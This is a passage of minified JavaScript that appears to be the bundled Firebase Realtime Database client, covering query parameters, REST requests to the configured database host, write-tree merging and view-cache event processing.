                .updateImmediateChild(a.name, e9.EMPTY_NODE))
            : e;
        }
      }
      class tc {
        constructor() {
          (this.limitSet_ = !1),
            (this.startSet_ = !1),
            (this.startNameSet_ = !1),
            (this.startAfterSet_ = !1),
            (this.endSet_ = !1),
            (this.endNameSet_ = !1),
            (this.endBeforeSet_ = !1),
            (this.limit_ = 0),
            (this.viewFrom_ = ""),
            (this.indexStartValue_ = null),
            (this.indexStartName_ = ""),
            (this.indexEndValue_ = null),
            (this.indexEndName_ = ""),
            (this.index_ = e2);
        }
        hasStart() {
          return this.startSet_;
        }
        isViewFromLeft() {
          return "" === this.viewFrom_
            ? this.startSet_
            : "l" === this.viewFrom_;
        }
        getIndexStartValue() {
          return (
            (0, y.hu)(this.startSet_, "Only valid if start has been set"),
            this.indexStartValue_
          );
        }
        getIndexStartName() {
          return (
            (0, y.hu)(this.startSet_, "Only valid if start has been set"),
            this.startNameSet_ ? this.indexStartName_ : V
          );
        }
        hasEnd() {
          return this.endSet_;
        }
        getIndexEndValue() {
          return (
            (0, y.hu)(this.endSet_, "Only valid if end has been set"),
            this.indexEndValue_
          );
        }
        getIndexEndName() {
          return (
            (0, y.hu)(this.endSet_, "Only valid if end has been set"),
            this.endNameSet_ ? this.indexEndName_ : z
          );
        }
        hasLimit() {
          return this.limitSet_;
        }
        hasAnchoredLimit() {
          return this.limitSet_ && "" !== this.viewFrom_;
        }
        getLimit() {
          return (
            (0, y.hu)(this.limitSet_, "Only valid if limit has been set"),
            this.limit_
          );
        }
        getIndex() {
          return this.index_;
        }
        loadsAllData() {
          return !(this.startSet_ || this.endSet_ || this.limitSet_);
        }
        isDefault() {
          return this.loadsAllData() && this.index_ === e2;
        }
        copy() {
          let e = new tc();
          return (
            (e.limitSet_ = this.limitSet_),
            (e.limit_ = this.limit_),
            (e.startSet_ = this.startSet_),
            (e.startAfterSet_ = this.startAfterSet_),
            (e.indexStartValue_ = this.indexStartValue_),
            (e.startNameSet_ = this.startNameSet_),
            (e.indexStartName_ = this.indexStartName_),
            (e.endSet_ = this.endSet_),
            (e.endBeforeSet_ = this.endBeforeSet_),
            (e.indexEndValue_ = this.indexEndValue_),
            (e.endNameSet_ = this.endNameSet_),
            (e.indexEndName_ = this.indexEndName_),
            (e.index_ = this.index_),
            (e.viewFrom_ = this.viewFrom_),
            e
          );
        }
      }
      function td(e) {
        let t,
          n = {};
        if (e.isDefault()) return n;
        if (
          (e.index_ === e2
            ? (t = "$priority")
            : e.index_ === ti
            ? (t = "$value")
            : e.index_ === eG
            ? (t = "$key")
            : ((0, y.hu)(e.index_ instanceof tn, "Unrecognized index type!"),
              (t = e.index_.toString())),
          (n.orderBy = (0, y.Wl)(t)),
          e.startSet_)
        ) {
          let i = e.startAfterSet_ ? "startAfter" : "startAt";
          (n[i] = (0, y.Wl)(e.indexStartValue_)),
            e.startNameSet_ && (n[i] += "," + (0, y.Wl)(e.indexStartName_));
        }
        if (e.endSet_) {
          let r = e.endBeforeSet_ ? "endBefore" : "endAt";
          (n[r] = (0, y.Wl)(e.indexEndValue_)),
            e.endNameSet_ && (n[r] += "," + (0, y.Wl)(e.indexEndName_));
        }
        return (
          e.limitSet_ &&
            (e.isViewFromLeft()
              ? (n.limitToFirst = e.limit_)
              : (n.limitToLast = e.limit_)),
          n
        );
      }
      function t_(e) {
        let t = {};
        if (
          (e.startSet_ &&
            ((t.sp = e.indexStartValue_),
            e.startNameSet_ && (t.sn = e.indexStartName_),
            (t.sin = !e.startAfterSet_)),
          e.endSet_ &&
            ((t.ep = e.indexEndValue_),
            e.endNameSet_ && (t.en = e.indexEndName_),
            (t.ein = !e.endBeforeSet_)),
          e.limitSet_)
        ) {
          t.l = e.limit_;
          let n = e.viewFrom_;
          "" === n && (n = e.isViewFromLeft() ? "l" : "r"), (t.vf = n);
        }
        return e.index_ !== e2 && (t.i = e.index_.toString()), t;
      }
      class tp extends ek {
        constructor(e, t, n, i) {
          super(),
            (this.repoInfo_ = e),
            (this.onDataUpdate_ = t),
            (this.authTokenProvider_ = n),
            (this.appCheckTokenProvider_ = i),
            (this.log_ = L("p:rest:")),
            (this.listens_ = {});
        }
        reportStats(e) {
          throw Error("Method not implemented.");
        }
        static getListenId_(e, t) {
          return void 0 !== t
            ? "tag$" + t
            : ((0, y.hu)(
                e._queryParams.isDefault(),
                "should have a tag if it's not a default query."
              ),
              e._path.toString());
        }
        listen(e, t, n, i) {
          let r = e._path.toString();
          this.log_("Listen called for " + r + " " + e._queryIdentifier);
          let s = tp.getListenId_(e, n),
            o = {};
          this.listens_[s] = o;
          let l = td(e._queryParams);
          this.restRequest_(r + ".json", l, (e, t) => {
            let l = t;
            404 === e && ((l = null), (e = null)),
              null === e && this.onDataUpdate_(r, l, !1, n),
              (0, y.DV)(this.listens_, s) === o &&
                i(
                  e
                    ? 401 === e
                      ? "permission_denied"
                      : "rest_error:" + e
                    : "ok",
                  null
                );
          });
        }
        unlisten(e, t) {
          let n = tp.getListenId_(e, t);
          delete this.listens_[n];
        }
        get(e) {
          let t = td(e._queryParams),
            n = e._path.toString(),
            i = new y.BH();
          return (
            this.restRequest_(n + ".json", t, (e, t) => {
              let r = t;
              404 === e && ((r = null), (e = null)),
                null === e
                  ? (this.onDataUpdate_(n, r, !1, null), i.resolve(r))
                  : i.reject(Error(r));
            }),
            i.promise
          );
        }
        refreshAuthToken(e) {}
        restRequest_(e, t = {}, n) {
          return (
            (t.format = "export"),
            Promise.all([
              this.authTokenProvider_.getToken(!1),
              this.appCheckTokenProvider_.getToken(!1),
            ]).then(([i, r]) => {
              i && i.accessToken && (t.auth = i.accessToken),
                r && r.token && (t.ac = r.token);
              let s =
                (this.repoInfo_.secure ? "https://" : "http://") +
                this.repoInfo_.host +
                e +
                "?ns=" +
                this.repoInfo_.namespace +
                (0, y.xO)(t);
              this.log_("Sending REST request for " + s);
              let o = new XMLHttpRequest();
              (o.onreadystatechange = () => {
                if (n && 4 === o.readyState) {
                  this.log_(
                    "REST Response for " + s + " received. status:",
                    o.status,
                    "response:",
                    o.responseText
                  );
                  let e = null;
                  if (o.status >= 200 && o.status < 300) {
                    try {
                      e = (0, y.cI)(o.responseText);
                    } catch (t) {
                      U(
                        "Failed to parse JSON response for " +
                          s +
                          ": " +
                          o.responseText
                      );
                    }
                    n(null, e);
                  } else
                    401 !== o.status &&
                      404 !== o.status &&
                      U(
                        "Got unsuccessful REST response for " +
                          s +
                          " Status: " +
                          o.status
                      ),
                      n(o.status);
                  n = null;
                }
              }),
                o.open("GET", s, !0),
                o.send();
            })
          );
        }
      }
      class tf {
        constructor() {
          this.rootNode_ = e9.EMPTY_NODE;
        }
        getNode(e) {
          return this.rootNode_.getChild(e);
        }
        updateSnapshot(e, t) {
          this.rootNode_ = this.rootNode_.updateChild(e, t);
        }
      }
      function tg() {
        return { value: null, children: new Map() };
      }
      function tm(e, t, n) {
        null !== e.value
          ? n(t, e.value)
          : (function (e, t) {
              e.children.forEach((e, n) => {
                t(n, e);
              });
            })(e, (e, i) => {
              tm(i, new eN(t.toString() + "/" + e), n);
            });
      }
      class ty {
        constructor(e) {
          (this.collection_ = e), (this.last_ = null);
        }
        get() {
          let e = this.collection_.get(),
            t = Object.assign({}, e);
          return (
            this.last_ &&
              X(this.last_, (e, n) => {
                t[e] = t[e] - n;
              }),
            (this.last_ = e),
            t
          );
        }
      }
      class tv {
        constructor(e, t) {
          (this.server_ = t),
            (this.statsToReport_ = {}),
            (this.statsListener_ = new ty(e)),
            ei(
              this.reportStats_.bind(this),
              Math.floor(1e4 + 2e4 * Math.random())
            );
        }
        reportStats_() {
          let e = this.statsListener_.get(),
            t = {},
            n = !1;
          X(e, (e, i) => {
            i > 0 &&
              (0, y.r3)(this.statsToReport_, e) &&
              ((t[e] = i), (n = !0));
          }),
            n && this.server_.reportStats(t),
            ei(
              this.reportStats_.bind(this),
              Math.floor(2 * Math.random() * 3e5)
            );
        }
      }
      function tT(e) {
        return { fromUser: !1, fromServer: !0, queryId: e, tagged: !0 };
      }
      ((p = f || (f = {}))[(p.OVERWRITE = 0)] = "OVERWRITE"),
        (p[(p.MERGE = 1)] = "MERGE"),
        (p[(p.ACK_USER_WRITE = 2)] = "ACK_USER_WRITE"),
        (p[(p.LISTEN_COMPLETE = 3)] = "LISTEN_COMPLETE");
      class tI {
        constructor(e, t, n) {
          (this.path = e),
            (this.affectedTree = t),
            (this.revert = n),
            (this.type = f.ACK_USER_WRITE),
            (this.source = {
              fromUser: !0,
              fromServer: !1,
              queryId: null,
              tagged: !1,
            });
        }
        operationForChild(e) {
          if (!eq(this.path))
            return (
              (0, y.hu)(
                eP(this.path) === e,
                "operationForChild called for unrelated child."
              ),
              new tI(eR(this.path), this.affectedTree, this.revert)
            );
          if (null != this.affectedTree.value)
            return (
              (0, y.hu)(
                this.affectedTree.children.isEmpty(),
                "affectedTree should not have overlapping affected paths."
              ),
              this
            );
          {
            let t = this.affectedTree.subtree(new eN(e));
            return new tI(eS(), t, this.revert);
          }
        }
      }
      class tk {
        constructor(e, t) {
          (this.source = e), (this.path = t), (this.type = f.LISTEN_COMPLETE);
        }
        operationForChild(e) {
          return eq(this.path)
            ? new tk(this.source, eS())
            : new tk(this.source, eR(this.path));
        }
      }
      class tb {
        constructor(e, t, n) {
          (this.source = e),
            (this.path = t),
            (this.snap = n),
            (this.type = f.OVERWRITE);
        }
        operationForChild(e) {
          return eq(this.path)
            ? new tb(this.source, eS(), this.snap.getImmediateChild(e))
            : new tb(this.source, eR(this.path), this.snap);
        }
      }
      class tE {
        constructor(e, t, n) {
          (this.source = e),
            (this.path = t),
            (this.children = n),
            (this.type = f.MERGE);
        }
        operationForChild(e) {
          if (!eq(this.path))
            return (
              (0, y.hu)(
                eP(this.path) === e,
                "Can't get a merge for a child not on the path of the operation"
              ),
              new tE(this.source, eR(this.path), this.children)
            );
          {
            let t = this.children.subtree(new eN(e));
            return t.isEmpty()
              ? null
              : t.value
              ? new tb(this.source, eS(), t.value)
              : new tE(this.source, eS(), t);
          }
        }
        toString() {
          return (
            "Operation(" +
            this.path +
            ": " +
            this.source.toString() +
            " merge: " +
            this.children.toString() +
            ")"
          );
        }
      }
      class tN {
        constructor(e, t, n) {
          (this.node_ = e), (this.fullyInitialized_ = t), (this.filtered_ = n);
        }
        isFullyInitialized() {
          return this.fullyInitialized_;
        }
        isFiltered() {
          return this.filtered_;
        }
        isCompleteForPath(e) {
          if (eq(e)) return this.isFullyInitialized() && !this.filtered_;
          let t = eP(e);
          return this.isCompleteForChild(t);
        }
        isCompleteForChild(e) {
          return (
            (this.isFullyInitialized() && !this.filtered_) ||
            this.node_.hasChild(e)
          );
        }
        getNode() {
          return this.node_;
        }
      }
      class tS {
        constructor(e) {
          (this.query_ = e),
            (this.index_ = this.query_._queryParams.getIndex());
        }
      }
      function tP(e, t, n, i, r, s) {
        let o = i.filter((e) => e.type === n);
        o.sort((t, n) =>
          (function (e, t, n) {
            if (null == t.childName || null == n.childName)
              throw (0, y.g5)("Should only compare child_ events.");
            let i = new ez(t.childName, t.snapshotNode),
              r = new ez(n.childName, n.snapshotNode);
            return e.index_.compare(i, r);
          })(e, t, n)
        ),
          o.forEach((n) => {
            var i;
            let o =
              ("value" === (i = n).type ||
                "child_removed" === i.type ||
                (i.prevName = s.getPredecessorChildName(
                  i.childName,
                  i.snapshotNode,
                  e.index_
                )),
              i);
            r.forEach((i) => {
              i.respondsTo(n.type) && t.push(i.createEvent(o, e.query_));
            });
          });
      }
      function tx(e, t) {
        return { eventCache: e, serverCache: t };
      }
      function tR(e, t, n, i) {
        return tx(new tN(t, n, i), e.serverCache);
      }
      function tD(e, t, n, i) {
        return tx(e.eventCache, new tN(t, n, i));
      }
      function tM(e) {
        return e.eventCache.isFullyInitialized()
          ? e.eventCache.getNode()
          : null;
      }
      function tF(e) {
        return e.serverCache.isFullyInitialized()
          ? e.serverCache.getNode()
          : null;
      }
      class tq {
        constructor(e, t = (() => (u || (u = new eX(K)), u))()) {
          (this.value = e), (this.children = t);
        }
        static fromObject(e) {
          let t = new tq(null);
          return (
            X(e, (e, n) => {
              t = t.set(new eN(e), n);
            }),
            t
          );
        }
        isEmpty() {
          return null === this.value && this.children.isEmpty();
        }
        findRootMostMatchingPathAndValue(e, t) {
          if (null != this.value && t(this.value))
            return { path: eS(), value: this.value };
          if (eq(e)) return null;
          {
            let n = eP(e),
              i = this.children.get(n);
            if (null === i) return null;
            {
              let r = i.findRootMostMatchingPathAndValue(eR(e), t);
              if (null == r) return null;
              return { path: eA(new eN(n), r.path), value: r.value };
            }
          }
        }
        findRootMostValueAndPath(e) {
          return this.findRootMostMatchingPathAndValue(e, () => !0);
        }
        subtree(e) {
          if (eq(e)) return this;
          {
            let t = eP(e),
              n = this.children.get(t);
            return null !== n ? n.subtree(eR(e)) : new tq(null);
          }
        }
        set(e, t) {
          if (eq(e)) return new tq(t, this.children);
          {
            let n = eP(e),
              r = (this.children.get(n) || new tq(null)).set(eR(e), t),
              s = this.children.insert(n, r);
            return new tq(this.value, s);
          }
        }
        remove(e) {
          if (eq(e))
            return this.children.isEmpty()
              ? new tq(null)
              : new tq(null, this.children);
          {
            let t = eP(e),
              n = this.children.get(t);
            if (!n) return this;
            {
              let i,
                r = n.remove(eR(e));
              return (
                (i = r.isEmpty()
                  ? this.children.remove(t)
                  : this.children.insert(t, r)),
                null === this.value && i.isEmpty()
                  ? new tq(null)
                  : new tq(this.value, i)
              );
            }
          }
        }
        get(e) {
          if (eq(e)) return this.value;
          {
            let t = eP(e),
              n = this.children.get(t);
            return n ? n.get(eR(e)) : null;
          }
        }
        setTree(e, t) {
          if (eq(e)) return t;
          {
            let n,
              i = eP(e),
              s = (this.children.get(i) || new tq(null)).setTree(eR(e), t);
            return (
              (n = s.isEmpty()
                ? this.children.remove(i)
                : this.children.insert(i, s)),
              new tq(this.value, n)
            );
          }
        }
        fold(e) {
          return this.fold_(eS(), e);
        }
        fold_(e, t) {
          let n = {};
          return (
            this.children.inorderTraversal((i, r) => {
              n[i] = r.fold_(eA(e, i), t);
            }),
            t(e, this.value, n)
          );
        }
        findOnPath(e, t) {
          return this.findOnPath_(e, eS(), t);
        }
        findOnPath_(e, t, n) {
          let i = !!this.value && n(t, this.value);
          if (i) return i;
          if (eq(e)) return null;
          {
            let r = eP(e),
              s = this.children.get(r);
            return s ? s.findOnPath_(eR(e), eA(t, r), n) : null;
          }
        }
        foreachOnPath(e, t) {
          return this.foreachOnPath_(e, eS(), t);
        }
        foreachOnPath_(e, t, n) {
          if (eq(e)) return this;
          {
            this.value && n(t, this.value);
            let i = eP(e),
              r = this.children.get(i);
            return r ? r.foreachOnPath_(eR(e), eA(t, i), n) : new tq(null);
          }
        }
        foreach(e) {
          this.foreach_(eS(), e);
        }
        foreach_(e, t) {
          this.children.inorderTraversal((n, i) => {
            i.foreach_(eA(e, n), t);
          }),
            this.value && t(e, this.value);
        }
        foreachChild(e) {
          this.children.inorderTraversal((t, n) => {
            n.value && e(t, n.value);
          });
        }
      }
      class tL {
        constructor(e) {
          this.writeTree_ = e;
        }
        static empty() {
          return new tL(new tq(null));
        }
      }
      function tO(e, t, n) {
        if (eq(t)) return new tL(new tq(n));
        {
          let i = e.writeTree_.findRootMostValueAndPath(t);
          if (null != i) {
            let r = i.path,
              s = i.value,
              o = eL(r, t);
            return (s = s.updateChild(o, n)), new tL(e.writeTree_.set(r, s));
          }
          {
            let l = new tq(n),
              a = e.writeTree_.setTree(t, l);
            return new tL(a);
          }
        }
      }
      function tW(e, t, n) {
        let i = e;
        return (
          X(n, (e, n) => {
            i = tO(i, eA(t, e), n);
          }),
          i
        );
      }
      function tU(e, t) {
        if (eq(t)) return tL.empty();
        {
          let n = e.writeTree_.setTree(t, new tq(null));
          return new tL(n);
        }
      }
      function tH(e, t) {
        return null != tY(e, t);
      }
      function tY(e, t) {
        let n = e.writeTree_.findRootMostValueAndPath(t);
        return null != n
          ? e.writeTree_.get(n.path).getChild(eL(n.path, t))
          : null;
      }
      function tj(e) {
        let t = [],
          n = e.writeTree_.value;
        return (
          null != n
            ? n.isLeafNode() ||
              n.forEachChild(e2, (e, n) => {
                t.push(new ez(e, n));
              })
            : e.writeTree_.children.inorderTraversal((e, n) => {
                null != n.value && t.push(new ez(e, n.value));
              }),
          t
        );
      }
      function tV(e, t) {
        if (eq(t)) return e;
        {
          let n = tY(e, t);
          return new tL(null != n ? new tq(n) : e.writeTree_.subtree(t));
        }
      }
      function tz(e) {
        return e.writeTree_.isEmpty();
      }
      function tB(e, t) {
        return (function e(t, n, i) {
          if (null != n.value) return i.updateChild(t, n.value);
          {
            let r = null;
            return (
              n.children.inorderTraversal((n, s) => {
                ".priority" === n
                  ? ((0, y.hu)(
                      null !== s.value,
                      "Priority writes must always be leaf nodes"
                    ),
                    (r = s.value))
                  : (i = e(eA(t, n), s, i));
              }),
              i.getChild(t).isEmpty() ||
                null === r ||
                (i = i.updateChild(eA(t, ".priority"), r)),
              i
            );
          }
        })(eS(), e.writeTree_, t);
      }
      function tK(e) {
        return e.visible;
      }
      function tG(e, t, n) {
        let i = tL.empty();
        for (let r = 0; r < e.length; ++r) {
          let s = e[r];
          if (t(s)) {
            let o,
              l = s.path;
            if (s.snap)
              eW(n, l)
                ? (i = tO(i, (o = eL(n, l)), s.snap))
                : eW(l, n) &&
                  ((o = eL(l, n)), (i = tO(i, eS(), s.snap.getChild(o))));
            else {
              if (!s.children)
                throw (0, y.g5)("WriteRecord should have .snap or .children");
              if (eW(n, l)) i = tW(i, (o = eL(n, l)), s.children);
              else if (eW(l, n))
                if (eq((o = eL(l, n)))) i = tW(i, eS(), s.children);
                else {
                  let a = (0, y.DV)(s.children, eP(o));
                  if (a) {
                    let h = a.getChild(eR(o));
                    i = tO(i, eS(), h);
                  }
                }
            }
          }
        }
        return i;
      }
      function t$(e, t, n, i, r) {
        if (i || r) {
          let s = tV(e.visibleWrites, t);
          if (!r && tz(s)) return n;
          if (!r && null == n && !tH(s, eS())) return null;
          {
            let o = tG(
              e.allWrites,
              function (e) {
                return (
                  (e.visible || r) &&
                  (!i || !~i.indexOf(e.writeId)) &&
                  (eW(e.path, t) || eW(t, e.path))
                );
              },
              t
            );
            return tB(o, n || e9.EMPTY_NODE);
          }
        }
        {
          let a = tY(e.visibleWrites, t);
          if (null != a) return a;
          {
            let h = tV(e.visibleWrites, t);
            if (tz(h)) return n;
            if (null == n && !tH(h, eS())) return null;
            return tB(h, n || e9.EMPTY_NODE);
          }
        }
      }
      function tQ(e, t, n, i) {
        return t$(e.writeTree, e.treePath, t, n, i);
      }
      function tX(e, t) {
        return (function (e, t, n) {
          let i = e9.EMPTY_NODE,
            r = tY(e.visibleWrites, t);
          if (r)
            return (
              r.isLeafNode() ||
                r.forEachChild(e2, (e, t) => {
                  i = i.updateImmediateChild(e, t);
                }),
              i
            );
          if (n) {
            let s = tV(e.visibleWrites, t);
            return (
              n.forEachChild(e2, (e, t) => {
                let n = tB(tV(s, new eN(e)), t);
                i = i.updateImmediateChild(e, n);
              }),
              tj(s).forEach((e) => {
                i = i.updateImmediateChild(e.name, e.node);
              }),
              i
            );
          }
          return (
            tj(tV(e.visibleWrites, t)).forEach((e) => {
              i = i.updateImmediateChild(e.name, e.node);
            }),
            i
          );
        })(e.writeTree, e.treePath, t);
      }
      function tJ(e, t, n, i) {
        return (function (e, t, n, i, r) {
          (0, y.hu)(
            i || r,
            "Either existingEventSnap or existingServerSnap must exist"
          );
          let s = eA(t, n);
          if (tH(e.visibleWrites, s)) return null;
          {
            let o = tV(e.visibleWrites, s);
            return tz(o) ? r.getChild(n) : tB(o, r.getChild(n));
          }
        })(e.writeTree, e.treePath, t, n, i);
      }
      function tZ(e, t) {
        var n, i;
        return (
          (n = e.writeTree), (i = eA(e.treePath, t)), tY(n.visibleWrites, i)
        );
      }
      function t0(e, t, n) {
        return (function (e, t, n, i) {
          let r = eA(t, n),
            s = tY(e.visibleWrites, r);
          if (null != s) return s;
          if (!i.isCompleteForChild(n)) return null;
          return tB(tV(e.visibleWrites, r), i.getNode().getImmediateChild(n));
        })(e.writeTree, e.treePath, t, n);
      }
      function t1(e, t) {
        return t3(eA(e.treePath, t), e.writeTree);
      }
      function t3(e, t) {
        return { treePath: e, writeTree: t };
      }
      class t2 {
        constructor() {
          this.changeMap = new Map();
        }
        trackChildChange(e) {
          let t = e.type,
            n = e.childName;
          (0, y.hu)(
            "child_added" === t ||
              "child_changed" === t ||
              "child_removed" === t,
            "Only child changes supported for tracking"
          ),
            (0, y.hu)(
              ".priority" !== n,
              "Only non-priority child changes can be tracked."
            );
          let i = this.changeMap.get(n);
          if (i) {
            let r = i.type;
            if ("child_added" === t && "child_removed" === r)
              this.changeMap.set(n, tl(n, e.snapshotNode, i.snapshotNode));
            else if ("child_removed" === t && "child_added" === r)
              this.changeMap.delete(n);
            else if ("child_removed" === t && "child_changed" === r)
              this.changeMap.set(n, to(n, i.oldSnap));
            else if ("child_changed" === t && "child_added" === r)
              this.changeMap.set(n, ts(n, e.snapshotNode));
            else {
              if ("child_changed" !== t || "child_changed" !== r)
                throw (0, y.g5)(
                  "Illegal combination of changes: " +
                    e +
                    " occurred after " +
                    i
                );
              this.changeMap.set(n, tl(n, e.snapshotNode, i.oldSnap));
            }
          } else this.changeMap.set(n, e);
        }
        getChanges() {
          return Array.from(this.changeMap.values());
        }
      }
      let t4 = new (class {
        getCompleteChild(e) {
          return null;
        }
        getChildAfterChild(e, t, n) {
          return null;
        }
      })();
      class t5 {
        constructor(e, t, n = null) {
          (this.writes_ = e),
            (this.viewCache_ = t),
            (this.optCompleteServerCache_ = n);
        }
        getCompleteChild(e) {
          let t = this.viewCache_.eventCache;
          if (t.isCompleteForChild(e)) return t.getNode().getImmediateChild(e);
          {
            let n =
              null != this.optCompleteServerCache_
                ? new tN(this.optCompleteServerCache_, !0, !1)
                : this.viewCache_.serverCache;
            return t0(this.writes_, e, n);
          }
        }
        getChildAfterChild(e, t, n) {
          var i;
          let r =
              null != this.optCompleteServerCache_
                ? this.optCompleteServerCache_
                : tF(this.viewCache_),
            s = (function (e, t, n, i, r, s, o) {
              let l,
                a = tV(e.visibleWrites, t),
                h = tY(a, eS());
              if (null != h) l = h;
              else {
                if (null == n) return [];
                l = tB(a, n);
              }
              if ((l = l.withIndex(o)).isEmpty() || l.isLeafNode()) return [];
              {
                let u = [],
                  c = o.getCompare(),
                  d = s
                    ? l.getReverseIteratorFrom(i, o)
                    : l.getIteratorFrom(i, o),
                  _ = d.getNext();
                for (; _ && u.length < 1; )
                  0 !== c(_, i) && u.push(_), (_ = d.getNext());
                return u;
              }
            })((i = this.writes_).writeTree, i.treePath, r, t, 0, n, e);
          return 0 === s.length ? null : s[0];
        }
      }
      function t6(e, t, n, i, r, s) {
        let o = t.eventCache;
        if (null != tZ(i, n)) return t;
        {
          let l, a;
          if (eq(n))
            if (
              ((0, y.hu)(
                t.serverCache.isFullyInitialized(),
                "If change path is empty, we must have complete server data"
              ),
              t.serverCache.isFiltered())
            ) {
              let h = tF(t),
                c = tX(i, h instanceof e9 ? h : e9.EMPTY_NODE);
              l = e.filter.updateFullNode(t.eventCache.getNode(), c, s);
            } else {
              let d = tQ(i, tF(t));
              l = e.filter.updateFullNode(t.eventCache.getNode(), d, s);
            }
          else {
            let _ = eP(n);
            if (".priority" === _) {
              (0, y.hu)(
                1 === ex(n),
                "Can't have a priority with additional path components"
              );
              let p = o.getNode();
              a = t.serverCache.getNode();
              let f = tJ(i, n, p, a);
              l = null != f ? e.filter.updatePriority(p, f) : o.getNode();
            } else {
              let g,
                m = eR(n);
              if (o.isCompleteForChild(_)) {
                a = t.serverCache.getNode();
                let v = tJ(i, n, o.getNode(), a);
                g =
                  null != v
                    ? o.getNode().getImmediateChild(_).updateChild(m, v)
                    : o.getNode().getImmediateChild(_);
              } else g = t0(i, _, t.serverCache);
              l =
                null != g
                  ? e.filter.updateChild(o.getNode(), _, g, m, r, s)
                  : o.getNode();
            }
          }
          return tR(
            t,
            l,
            o.isFullyInitialized() || eq(n),
            e.filter.filtersNodes()
          );
        }
      }
      function t8(e, t, n, i, r, s, o, l) {
        let a,
          h = t.serverCache,
          u = o ? e.filter : e.filter.getIndexedFilter();
        if (eq(n)) a = u.updateFullNode(h.getNode(), i, null);
        else if (u.filtersNodes() && !h.isFiltered()) {
          let c = h.getNode().updateChild(n, i);
          a = u.updateFullNode(h.getNode(), c, null);
        } else {
          let d = eP(n);
          if (!h.isCompleteForPath(n) && ex(n) > 1) return t;
          let _ = eR(n),
            f = h.getNode().getImmediateChild(d).updateChild(_, i);
          a =
            ".priority" === d
              ? u.updatePriority(h.getNode(), f)
              : u.updateChild(h.getNode(), d, f, _, t4, null);
        }
        let g = tD(t, a, h.isFullyInitialized() || eq(n), u.filtersNodes());
        return t6(e, g, n, r, new t5(r, g, s), l);
      }
      function t7(e, t, n, i, r, s, o) {
        let l,
          a,
          h = t.eventCache,
          u = new t5(r, t, s);
        if (eq(n))
          (a = e.filter.updateFullNode(t.eventCache.getNode(), i, o)),
            (l = tR(t, a, !0, e.filter.filtersNodes()));
        else {
          let c = eP(n);
          if (".priority" === c)
            (a = e.filter.updatePriority(t.eventCache.getNode(), i)),
              (l = tR(t, a, h.isFullyInitialized(), h.isFiltered()));
          else {
            let d,
              _ = eR(n),
              p = h.getNode().getImmediateChild(c);
            if (eq(_)) d = i;
            else {
              let f = u.getCompleteChild(c);
              d =
                null != f
                  ? ".priority" === eD(_) && f.getChild(eF(_)).isEmpty()
                    ? f
                    : f.updateChild(_, i)
                  : e9.EMPTY_NODE;
            }
            if (p.equals(d)) l = t;
            else {
              l = tR(
                t,
                e.filter.updateChild(h.getNode(), c, d, _, u, o),
                h.isFullyInitialized(),
                e.filter.filtersNodes()
              );
            }
          }
        }
        return l;
      }
      function t9(e, t) {
        return e.eventCache.isCompleteForChild(t);
      }
      function ne(e, t, n) {
        return (
          n.foreach((e, n) => {
            t = t.updateChild(e, n);
          }),
          t
        );
      }
      function nt(e, t, n, i, r, s, o, l) {
        let a;
        if (
          t.serverCache.getNode().isEmpty() &&
          !t.serverCache.isFullyInitialized()
        )
          return t;
        let h = t;
        a = eq(n) ? i : new tq(null).setTree(n, i);
        let u = t.serverCache.getNode();
        return (
          a.children.inorderTraversal((n, i) => {
            if (u.hasChild(n)) {
              let c = ne(0, t.serverCache.getNode().getImmediateChild(n), i);
              h = t8(e, h, new eN(n), c, r, s, o, l);
            }
          }),
          a.children.inorderTraversal((n, i) => {
            let a = !t.serverCache.isCompleteForChild(n) && null === i.value;
            if (!u.hasChild(n) && !a) {
              let d = ne(0, t.serverCache.getNode().getImmediateChild(n), i);
              h = t8(e, h, new eN(n), d, r, s, o, l);
            }
          }),
          h
        );
      }
      class nn {
        constructor(e, t) {
          (this.query_ = e), (this.eventRegistrations_ = []);
          let n = this.query_._queryParams,
            i = new ta(n.getIndex()),
            r = n.loadsAllData()
              ? new ta(n.getIndex())
              : n.hasLimit()
              ? new tu(n)
              : new th(n);
          this.processor_ = { filter: r };
          let s = t.serverCache,
            o = t.eventCache,
            l = i.updateFullNode(e9.EMPTY_NODE, s.getNode(), null),
            a = r.updateFullNode(e9.EMPTY_NODE, o.getNode(), null),
            h = new tN(l, s.isFullyInitialized(), i.filtersNodes()),
            u = new tN(a, o.isFullyInitialized(), r.filtersNodes());
          (this.viewCache_ = tx(u, h)),
            (this.eventGenerator_ = new tS(this.query_));
        }
        get query() {
          return this.query_;
        }
      }
      function ni(e) {
        return 0 === e.eventRegistrations_.length;
      }
      function nr(e, t, n) {
        let i = [];
        if (n) {
          (0, y.hu)(
            null == t,
            "A cancel should cancel all event registrations."
          );
          let r = e.query._path;
          e.eventRegistrations_.forEach((e) => {
            let t = e.createCancelEvent(n, r);
            t && i.push(t);
          });
        }
        if (t) {
          let s = [];
          for (let o = 0; o < e.eventRegistrations_.length; ++o) {
            let l = e.eventRegistrations_[o];
            if (l.matches(t)) {
              if (t.hasAnyCallback()) {
                s = s.concat(e.eventRegistrations_.slice(o + 1));
                break;
              }
            } else s.push(l);
          }
          e.eventRegistrations_ = s;
        } else e.eventRegistrations_ = [];
        return i;
      }
      function ns(e, t, n, i) {
        var r, s;
        t.type === f.MERGE &&
          null !== t.source.queryId &&
          ((0, y.hu)(
            tF(e.viewCache_),
            "We should always have a full cache before handling merges"
          ),
          (0, y.hu)(
            tM(e.viewCache_),
            "Missing event cache, even though we have a server cache"
          ));
        let o = e.viewCache_,
          l = (function (e, t, n, i, r) {
            let s,
              o,
              l = new t2();
            if (n.type === f.OVERWRITE)
              n.source.fromUser
                ? (s = t7(e, t, n.path, n.snap, i, r, l))
                : ((0, y.hu)(n.source.fromServer, "Unknown source."),
                  (o =
                    n.source.tagged ||
                    (t.serverCache.isFiltered() && !eq(n.path))),
                  (s = t8(e, t, n.path, n.snap, i, r, o, l)));
            else if (n.type === f.MERGE) {
              var a, h;
              let u;
              n.source.fromUser
                ? ((a = n.path),
                  (h = n.children),
                  (u = t),
                  h.foreach((n, s) => {
                    let o = eA(a, n);
                    t9(t, eP(o)) && (u = t7(e, u, o, s, i, r, l));
                  }),
                  h.foreach((n, s) => {
                    let o = eA(a, n);
                    t9(t, eP(o)) || (u = t7(e, u, o, s, i, r, l));
                  }),
                  (s = u))
                : ((0, y.hu)(n.source.fromServer, "Unknown source."),
                  (o = n.source.tagged || t.serverCache.isFiltered()),
                  (s = nt(e, t, n.path, n.children, i, r, o, l)));
            } else if (n.type === f.ACK_USER_WRITE)
              s = n.revert
                ? (function (e, t, n, i, r, s) {
                    let o;
                    if (null != tZ(i, n)) return t;
                    {
                      let l,
                        a = new t5(i, t, r),
                        h = t.eventCache.getNode();
